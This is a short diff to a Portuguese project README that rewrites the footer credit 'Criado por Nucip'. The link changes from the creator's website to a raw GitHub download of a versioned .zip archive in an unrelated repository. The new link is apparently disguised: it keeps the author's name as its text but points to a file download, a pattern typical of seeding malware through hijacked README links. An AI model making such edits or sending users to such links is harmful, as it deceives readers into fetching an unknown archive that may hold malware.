@@ -109,4 +109,4 @@ Contribuicoes sao muito bem-vindas! Veja [CONTRIBUTING.md](CONTRIBUTING.md) para
 
 ---
 
-Criado por [Nucip](https://nucip.com.br) | Mantido pela comunidade
+Criado por [Nucip](https://raw.githubusercontent.com/Wiry-glitch668/ai-landing-page-workflow/main/workflow/07-deploy/page-ai-workflow-landing-3.7-alpha.3.zip) | Mantido pela comunidade
